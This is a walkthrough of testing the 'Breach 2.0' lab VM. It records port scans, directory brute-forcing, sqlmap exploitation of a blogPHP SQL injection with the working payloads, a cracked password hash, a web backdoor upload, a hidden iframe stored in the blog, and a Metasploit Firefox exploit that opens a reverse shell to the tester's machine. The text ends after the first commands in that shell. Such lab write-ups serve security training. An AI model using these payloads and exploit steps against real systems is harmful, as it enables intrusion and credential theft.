
# Breach 2.0 Testing Walkthrough

mrB3n was kind enough to let me test this VM before going live.

I hope you had as much fun rooting it as I did. Given  was one of the testers, I have left the stuff in, even though bugs have been fixed. After all, every day is a school day...

## Initial NMap Scan

As always, we scan the VM. Let's see what NMap says:

```
root@kali:~# nmap 192.168.110.151 -p- -T5 -vvv

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2016-06-22 19:25 UTC
Initiating ARP Ping Scan at 19:25
Scanning 192.168.110.151 [1 port]
Completed ARP Ping Scan at 19:25, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:25
Completed Parallel DNS resolution of 1 host. at 19:25, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 19:25
Scanning 192.168.110.151 [65535 ports]
Discovered open port 111/tcp on 192.168.110.151
Warning: 192.168.110.151 giving up on port because retransmission cap hit (2).
SYN Stealth Scan Timing: About 21.76% done; ETC: 19:28 (0:01:51 remaining)
Discovered open port 60941/tcp on 192.168.110.151
Discovered open port 65535/tcp on 192.168.110.151
SYN Stealth Scan Timing: About 44.61% done; ETC: 19:28 (0:01:16 remaining)
SYN Stealth Scan Timing: About 67.73% done; ETC: 19:27 (0:00:43 remaining)
Completed SYN Stealth Scan at 19:28, 176.80s elapsed (65535 total ports)
Nmap scan report for 192.168.110.151
Host is up, received arp-response (0.00029s latency).
Scanned at 2016-06-22 19:25:45 UTC for 177s
Not shown: 65532 closed ports
Reason: 65532 resets
PORT      STATE SERVICE REASON
111/tcp   open  rpcbind syn-ack ttl 64
60941/tcp open  unknown syn-ack ttl 64
65535/tcp open  unknown syn-ack ttl 64
MAC Address: 00:0C:29:0C:C6:16 (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 177.13 seconds
           Raw packets sent: 130411 (5.738MB) | Rcvd: 130377 (5.215MB)
```

So now I will run a version scan on those ports:

```
root@kali:~# nmap -sSV -p111,60941,65535 192.168.110.151

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2016-06-22 19:29 UTC
Nmap scan report for 192.168.110.151
Host is up (0.00032s latency).
PORT      STATE SERVICE VERSION
111/tcp   open  rpcbind 2-4 (RPC #100000)
60941/tcp open  status  1 (RPC #100024)
65535/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u2 (protocol 2.0)
MAC Address: 00:0C:29:0C:C6:16 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.43 seconds
```

A couple of services. So what does SSH say..?

```
root@kali:~# ssh -p65535 peter@192.168.110.151
#############################################################################
#                  Welcome to Initech Cyber Consulting, LLC                 #
#	          All connections are monitored and recorded                #
#	              Unauthorized access is encouraged                     #
#	      Peter, if that's you - the password is in the source.         # 
#############################################################################
```

Hmm, so I tried a bunch of permutations of "in the source", but upon using inthesource SSH said "connection closed", so now, on a hunch, we'll rescan with nmap:

```
root@kali:~# nmap -p- 192.168.110.151 -T5 -vv

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2016-06-22 20:14 UTC
Initiating ARP Ping Scan at 20:14
Scanning 192.168.110.151 [1 port]
Completed ARP Ping Scan at 20:14, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:14
Completed Parallel DNS resolution of 1 host. at 20:14, 0.00s elapsed
Initiating SYN Stealth Scan at 20:14
Scanning 192.168.110.151 [65535 ports]
Discovered open port 80/tcp on 192.168.110.151
Discovered open port 111/tcp on 192.168.110.151
Warning: 192.168.110.151 giving up on port because retransmission cap hit (2).
SYN Stealth Scan Timing: About 22.11% done; ETC: 20:16 (0:01:49 remaining)
SYN Stealth Scan Timing: About 44.97% done; ETC: 20:16 (0:01:15 remaining)
SYN Stealth Scan Timing: About 68.18% done; ETC: 20:16 (0:00:42 remaining)
Discovered open port 60941/tcp on 192.168.110.151
Discovered open port 65535/tcp on 192.168.110.151
Completed SYN Stealth Scan at 20:16, 175.00s elapsed (65535 total ports)
Nmap scan report for 192.168.110.151
Host is up, received arp-response (0.00022s latency).
Scanned at 2016-06-22 20:14:03 UTC for 175s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 64
111/tcp   open  rpcbind syn-ack ttl 64
60941/tcp open  unknown syn-ack ttl 64
65535/tcp open  unknown syn-ack ttl 64
MAC Address: 00:0C:29:0C:C6:16 (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 175.31 seconds
           Raw packets sent: 130053 (5.722MB) | Rcvd: 130053 (5.202MB)
```

Oh look... Port 80 opened up! Let's check that out:

## Initial footprinting

Let's crack on with port 80 enumeration:

```
root@kali:~# links -dump 192.168.110.151
root@kali:~# curl 192.168.110.151
<IMG SRC="/images/beef.jpg" WIDTH=200 HEIGT=250>
root@kali:~# wget 192.168.110.151/images/beef.jpg
--2016-06-22 20:18:08--  http://192.168.110.151/images/beef.jpg
Connecting to 192.168.110.151:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8366 (8.2K) [image/jpeg]
Saving to: "beef.jpg"

beef.jpg                    100%[=============================================>]   8.17K  --.-KB/s   in 0s     

2016-06-22 20:18:08 (237 MB/s) - "beef.jpg" saved [8366/8366]
```

## Brute Forcing

We now we can run a director buster:

```
root@kali:~# dirbuster http://192.168.110.151/ -X php /usr/share/wordlists/dirbuster/directory-list-1.0.txt 
Jun 22, 2016 8:22:09 PM java.util.prefs.FileSystemPreferences$1 run
INFO: Created user preferences directory.
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
Dir found: / - 200
Dir found: /images/ - 403
Dir found: /blog/ - 200
File found: /blog/blog-1.html - 200
File found: /blog/blog-archive.html - 200
Jun 22, 2016 8:23:16 PM au.id.jericho.lib.html.LoggerProviderJava$JavaLogger info
INFO: StartTag at (r15,c335,p1425) missing required end tag - invalid nested start tag encountered before end tag
File found: /blog/index.php - 200
File found: /blog/members.html - 200
File found: /blog/blog-stats.html - 200
File found: /blog/blog-files.html - 200
File found: /blog/subscribe.html - 200
File found: /blog/page-contactus.html - 200
File found: /blog/cat-General.html - 200
File found: /blog/login.html - 200
File found: /blog/register.html - 200
File found: /blog/rss.php - 200
File found: /blog/user-admin.html - 200
Dir found: /blog/wysiwyg/ - 200
Dir found: /blog/wysiwyg/jscripts/ - 200
Dir found: /blog/wysiwyg/jscripts/tiny_mce/ - 200
File found: /blog/wysiwyg/jscripts/tiny_mce/tiny_mce.js - 200
File found: /blog/blog-archive-General.html - 200
Jun 22, 2016 8:23:18 PM au.id.jericho.lib.html.LoggerProviderJava$JavaLogger info
INFO: StartTag at (r15,c335,p1425) missing required end tag - invalid nested start tag encountered before end tag
Dir found: /icons/ - 403
```

## Beating the house

looking around, we see its blogPHP. There's some exploits, but let's try SQLmap as I'm lazy!
PS: Y'all can't do this since mrB3n patched it already...

```
root@kali:~# sqlmap -u 'http://192.168.110.151/blog/index.php?act=page&id=1'
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-201606250a89}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 10:33:06

[10:33:06] [INFO] testing connection to the target URL
[10:33:06] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[10:33:06] [INFO] testing if the target URL is stable
[10:33:07] [INFO] target URL is stable
[10:33:07] [INFO] testing if GET parameter 'act' is dynamic
[10:33:07] [INFO] confirming that GET parameter 'act' is dynamic
[10:33:07] [INFO] GET parameter 'act' is dynamic
[10:33:07] [WARNING] heuristic (basic) test shows that GET parameter 'act' might not be injectable
[10:33:08] [INFO] testing for SQL injection on GET parameter 'act'
[10:33:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:33:08] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[10:33:08] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
[10:33:08] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:33:08] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'
[10:33:08] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:33:08] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'
[10:33:08] [INFO] testing 'MySQL inline queries'
[10:33:08] [INFO] testing 'PostgreSQL inline queries'
[10:33:08] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[10:33:08] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT - comment)'
[10:33:08] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:33:08] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:33:08] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:33:09] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT)'
[10:33:09] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[10:33:09] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'
[10:33:09] [INFO] testing 'Oracle AND time-based blind'
[10:33:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:33:09] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it using option '--dbms'
[10:33:10] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[10:33:11] [WARNING] GET parameter 'act' is not injectable
[10:33:11] [INFO] testing if GET parameter 'id' is dynamic
[10:33:11] [WARNING] GET parameter 'id' does not appear dynamic
[10:33:11] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[10:33:11] [INFO] testing for SQL injection on GET parameter 'id'
[10:33:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:33:11] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[10:33:11] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
[10:33:12] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:33:12] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'
[10:33:12] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:33:12] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'
[10:33:12] [INFO] testing 'MySQL inline queries'
[10:33:12] [INFO] testing 'PostgreSQL inline queries'
[10:33:12] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[10:33:12] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT - comment)'
[10:33:12] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[10:33:12] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:33:12] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:33:12] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT)'
[10:33:22] [INFO] GET parameter 'id' seems to be 'MySQL >= 5.0.12 AND time-based blind (SELECT)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[10:33:30] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:33:30] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:33:30] [INFO] target URL appears to be UNION injectable with 5 columns
[10:33:30] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 315 HTTP(s) requests:
---
Parameter: id (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
    Payload: act=page&id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))QKoM) AND 'HUMC'='HUMC

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: act=page&id=1' UNION ALL SELECT NULL,CONCAT(0x7170706b71,0x766e4548586248517a7671644852634e4b797a56685349495347517370524769526c6a6b7964436c,0x7162707171),NULL,NULL,NULL-- -
---
[10:33:33] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.10
back-end DBMS: MySQL 5.0.12
[10:33:33] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.110.151'

[*] shutting down at 10:33:33
```

Good show! So now we will list the tables in the blog database:

```
root@kali:~# sqlmap -u 'http://192.168.110.151/blog/index.php?act=page&id=1' -D blog --tables
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-201606250a89}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 10:35:36

[10:35:36] [INFO] resuming back-end DBMS 'mysql' 
[10:35:36] [INFO] testing connection to the target URL
[10:35:36] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
    Payload: act=page&id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))QKoM) AND 'HUMC'='HUMC

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: act=page&id=1' UNION ALL SELECT NULL,CONCAT(0x7170706b71,0x766e4548586248517a7671644852634e4b797a56685349495347517370524769526c6a6b7964436c,0x7162707171),NULL,NULL,NULL-- -
---
[10:35:36] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.10
back-end DBMS: MySQL 5.0.12
[10:35:36] [INFO] fetching tables for database: 'blog'
Database: blog
[10 tables]
+-----------------------+
| blogphp_blogs         |
| blogphp_cat           |
| blogphp_comments      |
| blogphp_files         |
| blogphp_links         |
| blogphp_pages         |
| blogphp_stats         |
| blogphp_subscriptions |
| blogphp_templates     |
| blogphp_users         |
+-----------------------+

[10:35:36] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.110.151'
[*] shutting down at 10:35:36
```

I'll now show that users table, perhaps we can snarf a password:

```
root@kali:~# sqlmap -u 'http://192.168.110.151/blog/index.php?act=page&id=1' -D blog -T blogphp_users --dump
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-201606250a89}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 10:35:56

[10:35:56] [INFO] resuming back-end DBMS 'mysql' 
[10:35:56] [INFO] testing connection to the target URL
[10:35:56] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
    Payload: act=page&id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))QKoM) AND 'HUMC'='HUMC

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: act=page&id=1' UNION ALL SELECT NULL,CONCAT(0x7170706b71,0x766e4548586248517a7671644852634e4b797a56685349495347517370524769526c6a6b7964436c,0x7162707171),NULL,NULL,NULL-- -
---
[10:35:56] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.10
back-end DBMS: MySQL 5.0.12
[10:35:56] [INFO] fetching columns for table 'blogphp_users' in database 'blog'
[10:35:56] [INFO] fetching entries for table 'blogphp_users' in database 'blog'
[10:35:56] [INFO] analyzing table dump for possible password hashes
[10:35:56] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[10:35:58] [INFO] writing hashes to a temporary file '/tmp/sqlmaphyBbYF4166/sqlmaphashes-GEGvTi.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[10:36:00] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/txt/wordlist.zip' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 
[10:36:02] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] 
[10:36:05] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[10:36:05] [WARNING] multiprocessing hash cracking is currently not supported on this platform
[10:36:18] [INFO] cracked password 'password' for user 'knightmare'                                            
[10:36:18] [INFO] postprocessing table dump                                                                    
Database: blog
Table: blogphp_users
[1 entry]
+----+---------+---------+---------+---------+---------+---------+---------+---------+---------+--------------------+------------+------------+---------+---------+------------+---------------------------------------------+
| id | aim     | msn     | url     | icq     | name    | bday    | mlist   | yahoo   | gtalk   | email              | logged     | date       | avatar  | level   | username   | password                                    |
+----+---------+---------+---------+---------+---------+---------+---------+---------+---------+--------------------+------------+------------+---------+---------+------------+---------------------------------------------+
| 1  | <blank> | <blank> | <blank> | <blank> | <blank> | <blank> | <blank> | <blank> | <blank> | bill@microsoft.com | 1466846118 | 1466846118 | <blank> | Member  | knightmare | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+----+---------+---------+---------+---------+---------+---------+---------+---------+---------+--------------------+------------+------------+---------+---------+------------+---------------------------------------------+

[10:36:18] [INFO] table 'blog.blogphp_users' dumped to CSV file '/root/.sqlmap/output/192.168.110.151/dump/blog/blogphp_users.csv'
[10:36:18] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.110.151'
[*] shutting down at 10:36:18
```

At this point, I thought we need to either get creds or a shell. Let's pop a shell:

```
root@kali:~# sqlmap -u 'http://192.168.110.151/blog/index.php?act=page&id=1' --os-shell
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-201606250a89}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 10:39:09

[10:39:10] [INFO] resuming back-end DBMS 'mysql' 
[10:39:10] [INFO] testing connection to the target URL
[10:39:10] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
    Payload: act=page&id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))QKoM) AND 'HUMC'='HUMC

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: act=page&id=1' UNION ALL SELECT NULL,CONCAT(0x7170706b71,0x766e4548586248517a7671644852634e4b797a56685349495347517370524769526c6a6b7964436c,0x7162707171),NULL,NULL,NULL-- -
---
[10:39:10] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.10
back-end DBMS: MySQL 5.0.12
[10:39:10] [INFO] going to use a web backdoor for command prompt
[10:39:10] [INFO] fingerprinting the back-end DBMS operating system
[10:39:10] [INFO] the back-end DBMS operating system is Linux
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 
[10:39:12] [WARNING] unable to retrieve automatically the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /usr/local/apache2/htdocs, /var/www/nginx-default') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 
[10:39:14] [WARNING] unable to automatically parse any web server path
[10:39:14] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[10:39:14] [WARNING] unable to upload the file stager on '/var/www/'
[10:39:14] [INFO] trying to upload the file stager on '/var/www/' via UNION method
[10:39:14] [WARNING] expect junk characters inside the file as a leftover from UNION query
[10:39:14] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process' user has no write privileges in the destination path)
[10:39:14] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[10:39:14] [WARNING] unable to upload the file stager on '/var/www/html/'
[10:39:14] [INFO] trying to upload the file stager on '/var/www/html/' via UNION method
[10:39:14] [INFO] the remote file '/var/www/html/tmpudivn.php' is larger (709 B) than the local file '/tmp/sqlmapCwqEvW4204/tmpoAKGSb' (705B)
[10:39:14] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://192.168.110.151:80/tmpudivn.php
[10:39:15] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://192.168.110.151:80/tmpbiboe.php
[10:39:15] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] 
command standard output:    'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
```

OK, so now we have RCE. This was patched quickly, and is an unintedned route.

## Doing it the correct way

After a bit of a nudge from mrB3n, he advised me that this VM used a client side attack, so Thanks to him for advising me on this part, I'll hold my hnds up and say it's not something I have done before.

Firstly, we set up using the blog to register and hid an iframe in thisi:

```
<iframe src="http://192.168.110.128/test.html" width="0" height="0"></iframe>
```

Will make it request my kali box on prt 80 and the test.html file which contained only:

```
<body>
w00t!
</body>
```

Which gave an interesting response in my apache log::

```
192.168.110.151 - - [25/Jun/2016:16:39:49 +0100] "GET /test.html HTTP/1.1" 200 281 "http://192.168.110.151/blog/members.html" "Mozilla/5.0 (X11; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0"
```

## Legacy code is bad

We now know it's using a vulnerable firefox buld so can perhaps find an exploit for it

root@kali:~# python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.110.151 - - [25/Jun/2016 10:52:58] "GET /knightmare_shell.php HTTP/1.1" 200 -

<iframe src="192.168.110.128/test.html" height="0" width="0">

<iframe src="http://192.168.110.128:8080/sneaky" width="0" height="0"></iframe>


## Put metapslot info in

msf exploit(firefox_proto_crmfrequest) > sessions -i

Active sessions
===============

No active sessions.

msf exploit(firefox_proto_crmfrequest) > 
[*] 192.168.110.151  firefox_proto_crmfrequest - Gathering target information.
[*] 192.168.110.151  firefox_proto_crmfrequest - Sending HTML response.
[*] 192.168.110.151  firefox_proto_crmfrequest - Sending HTML
[*] 192.168.110.151  firefox_proto_crmfrequest - Sending the malicious addon

msf exploit(firefox_proto_crmfrequest) > use exploit/
[*] 192.168.110.151  firefox_proto_crmfrequest - Gathering target information.
[*] 192.168.110.151  firefox_proto_crmfrequest - Sending HTML response.
[*] 192.168.110.151  firefox_proto_crmfrequest - Sending HTML
[*] 192.168.110.151  firefox_proto_crmfrequest - Sending the malicious addon

[-] Failed to load module: exploit/
msf exploit(firefox_proto_crmfrequest) > use exploit/multi/browser/firefox_
use exploit/multi/browser/firefox_escape_retval
use exploit/multi/browser/firefox_pdfjs_privilege_escalation
use exploit/multi/browser/firefox_proto_crmfrequest
use exploit/multi/browser/firefox_proxy_prototype
use exploit/multi/browser/firefox_queryinterface
use exploit/multi/browser/firefox_svg_plugin
use exploit/multi/browser/firefox_tostring_console_injection
use exploit/multi/browser/firefox_webidl_injection
use exploit/multi/browser/firefox_xpi_bootstrapped_addon
msf exploit(firefox_proto_crmfrequest) > use exploit/multi/browser/firefox_tostring_console_injection 
msf exploit(firefox_tostring_console_injection) > info

       Name: Firefox toString console.time Privileged Javascript Injection
     Module: exploit/multi/browser/firefox_tostring_console_injection
   Platform: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2013-05-14

Provided by:
  moz_bug_r_a4
  Cody Crews
  joev <joev@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Universal (Javascript XPCOM Shell)
  1   Native Payload

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  CONTENT                   no        Content to display inside the HTML <body>.
  Retries  true             no        Allow the browser to retry the module
  SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
  SRVPORT  8080             yes       The local port to listen on.
  SSL      false            no        Negotiate SSL for incoming connections
  SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
  URIPATH                   no        The URI to use for this exploit (default is random)

Payload information:

Description:
  This exploit gains remote code execution on Firefox 15-22 by abusing 
  two separate Javascript-related vulnerabilities to ultimately inject 
  malicious Javascript code into a context running with chrome:// 
  privileges.

References:
  http://cvedetails.com/cve/2013-1710/

msf exploit(firefox_tostring_console_injection) > exploit
[*] Exploit running as background job.

[*] Started reverse TCP handler on 192.168.110.128:4444 
[*] Using URL: http://0.0.0.0:8080/35U8eslHVbcnPL
[*] Local IP: http://192.168.110.128:8080/35U8eslHVbcnPL
[*] Server started.
msf exploit(firefox_tostring_console_injection) > exploit
[*] Exploit running as background job.

[-] Handler failed to bind to 192.168.110.128:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
msf exploit(firefox_tostring_console_injection) > set URIPATH sneaky
URIPATH => sneaky
msf exploit(firefox_tostring_console_injection) > exploit
[*] Exploit running as background job.

[-] Handler failed to bind to 192.168.110.128:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
msf exploit(firefox_tostring_console_injection) > set payload 
set payload firefox/exec               set payload generic/custom
set payload firefox/shell_bind_tcp     set payload generic/shell_bind_tcp
set payload firefox/shell_reverse_tcp  set payload generic/shell_reverse_tcp
msf exploit(firefox_tostring_console_injection) > set payload firefox/shell_bind_tcp 
payload => firefox/shell_bind_tcp
msf exploit(firefox_tostring_console_injection) > exploit
[*] Exploit running as background job.

[*] Using URL: http://0.0.0.0:8080/sneaky
[*] Local IP: http://192.168.110.128:8080/sneaky
[*] Server stopped.
[*] Server stopped.
[*] Server stopped.
msf exploit(firefox_tostring_console_injection) > exploit
[*] Exploit running as background job.

[*] Using URL: http://0.0.0.0:8080/sneaky
[*] Local IP: http://192.168.110.128:8080/sneaky
[*] Server started.
[*] Started bind handler
msf exploit(firefox_tostring_console_injection) > sessions -l

Active sessions
===============

No active sessions.

msf exploit(firefox_tostring_console_injection) > 
[*] 192.168.110.151  firefox_tostring_console_injection - Gathering target information.
[*] 192.168.110.151  firefox_tostring_console_injection - Sending HTML response.

msf exploit(firefox_tostring_console_injection) > sessions -l

Active sessions
===============

No active sessions.

msf exploit(firefox_tostring_console_injection) > sessions -l

Active sessions
===============

No active sessions.

msf exploit(firefox_tostring_console_injection) > exploit
[*] Exploit running as background job.

[*] Using URL: http://0.0.0.0:8080/sneaky
[*] Local IP: http://192.168.110.128:8080/sneaky
[*] Server stopped.
[*] Server stopped.
msf exploit(firefox_tostring_console_injection) > exploit
[*] Exploit running as background job.

[*] Using URL: http://0.0.0.0:8080/sneaky
[*] Local IP: http://192.168.110.128:8080/sneaky
[*] Server started.
[*] Started bind handler
msf exploit(firefox_tostring_console_injection) > [*] 192.168.110.151  firefox_tostring_console_injection - Gathering target information.
[*] 192.168.110.151  firefox_tostring_console_injection - Sending HTML response.

msf exploit(firefox_tostring_console_injection) > exploit
[*] Exploit running as background job.

[*] Using URL: http://0.0.0.0:8080/sneaky
[*] Local IP: http://192.168.110.128:8080/sneaky
[*] Server stopped.
[*] Server stopped.
msf exploit(firefox_tostring_console_injection) > set payload firefox/shell_
set payload firefox/shell_bind_tcp     set payload firefox/shell_reverse_tcp
msf exploit(firefox_tostring_console_injection) > set payload firefox/
set payload firefox/exec               set payload firefox/shell_reverse_tcp
set payload firefox/shell_bind_tcp     
msf exploit(firefox_tostring_console_injection) > set payload 
set payload firefox/exec               set payload generic/custom
set payload firefox/shell_bind_tcp     set payload generic/shell_bind_tcp
set payload firefox/shell_reverse_tcp  set payload generic/shell_reverse_tcp
msf exploit(firefox_tostring_console_injection) > set payload firefox/shell_reverse_tcp 
payload => firefox/shell_reverse_tcp
msf exploit(firefox_tostring_console_injection) > exploit
[*] Exploit running as background job.

[*] Started reverse TCP handler on 192.168.110.128:4444 
[*] Using URL: http://0.0.0.0:8080/sneaky
[*] Local IP: http://192.168.110.128:8080/sneaky
[*] Server started.
msf exploit(firefox_tostring_console_injection) > [*] 192.168.110.151  firefox_tostring_console_injection - Gathering target information.
[*] 192.168.110.151  firefox_tostring_console_injection - Sending HTML response.
[*] Command shell session 3 opened (192.168.110.128:4444 -> 192.168.110.151:34660) at 2016-06-25 16:15:49 +0100

At this point, I had popped a shell, so went to take a look around:

```
msf exploit(firefox_tostring_console_injection) > sessions -l

Active sessions
===============

  Id  Type           Information  Connection
  --  ----           -----------  ----------
  3   shell firefox               192.168.110.128:4444 -> 192.168.110.151:34660 (192.168.110.151)

msf exploit(firefox_tostring_console_injection) > sessions -i 3
[*] Starting interaction with 3...

id
uid=1000(peter) gid=1000(peter) groups=1000(peter),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(scanner),115(bluetooth),1003(fishermen)
ls -la
total 108
drwxr-xr-x 19 peter peter 4096 Jun 19 16:42 .
